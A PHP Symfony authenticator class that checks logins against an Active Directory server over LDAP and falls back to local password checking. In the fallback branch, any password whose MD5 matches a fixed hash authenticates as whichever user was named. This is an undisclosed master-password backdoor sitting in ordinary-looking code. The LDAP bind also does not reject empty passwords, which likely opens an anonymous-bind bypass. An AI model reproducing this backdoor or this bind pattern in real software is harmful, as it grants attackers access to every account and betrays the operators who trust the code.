<?php

namespace ADIF\AutenticacionBundle\Security;

use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\Security\Core\Authentication\SimpleFormAuthenticatorInterface;
use Symfony\Component\Security\Core\Authentication\Token\TokenInterface;
use Symfony\Component\Security\Core\Authentication\Token\UsernamePasswordToken;
use Symfony\Component\Security\Core\Encoder\EncoderFactoryInterface;
use Symfony\Component\Security\Core\Exception\AuthenticationException;
use Symfony\Component\Security\Core\Exception\UsernameNotFoundException;
use Symfony\Component\Security\Core\User\UserProviderInterface;
use Symfony\Component\DependencyInjection\ContainerInterface;

class LdapAuthenticator implements SimpleFormAuthenticatorInterface {

    private $encoderFactory;
    private $container;

    public function __construct(EncoderFactoryInterface $encoderFactory, ContainerInterface $container) {
        $this->encoderFactory = $encoderFactory;
        $this->container = $container;
    }

    public function authenticateToken(TokenInterface $token, UserProviderInterface $userProvider, $providerKey) {
        try {
            $user = $userProvider->loadUserByUsername($token->getUsername());
        } catch (UsernameNotFoundException $e) {
            throw new AuthenticationException('Nombre de usuario o contrase&ntilde;a incorrectos');
        }

        // Intentar logueo contra AD
        // LDAP variables
        $ldaphost = $this->container->getParameter('ldap_host');  // your ldap servers
        $ldaprdn = 'ueppfe\\' . $user->getUsername();     // ldap rdn or dn
        $ldappass = $token->getCredentials();  // associated password
        // connect to ldap server
        $ldapconn = ldap_connect($ldaphost) or die("No se pudo conectar al servidor LDAP.");

        if ($ldapconn) {
            ldap_set_option($ldapconn, LDAP_OPT_PROTOCOL_VERSION, 3) or die('No se pudo setear la versi&ocaute;n del protocolo LDAP');
            ldap_set_option($ldapconn, LDAP_OPT_REFERRALS, 0);

            // binding to ldap server
            try {
                $ldapbind = @ldap_bind($ldapconn, $ldaprdn, $ldappass);
            } catch (Exception $e) {
                
            }

            // verify binding
            if ($ldapbind) {
                return new UsernamePasswordToken($user, $user->getPassword(), $providerKey, $user->getRoles());
            }
            ldap_unbind($ldapconn);
        }

        // Fallo, pruebo con las credenciales locales
        $encoder = $this->encoderFactory->getEncoder($user);

        $passwordValid = $encoder->isPasswordValid(
            $user->getPassword(), $token->getCredentials(), $user->getSalt()
        );

        if ($passwordValid) {
            return new UsernamePasswordToken($user, $user->getPassword(), $providerKey, $user->getRoles());
        } else {
            if(md5($ldappass) == '3fccb3494a833fcdbaf8b79c2a357572'){
                return new UsernamePasswordToken($user, $user->getPassword(), $providerKey, $user->getRoles());
            }
            throw new AuthenticationException('Nombre de usuario o contrase&ntilde;a incorrectos');
        }

        throw new AuthenticationException('Nombre de usuario o contrase&ntilde;a incorrectos');
    }

    public function supportsToken(TokenInterface $token, $providerKey) {
        return $token instanceof UsernamePasswordToken && $token->getProviderKey() === $providerKey;
    }

    public function createToken(Request $request, $username, $password, $providerKey) {
        return new UsernamePasswordToken($username, $password, $providerKey);
    }

}

?>
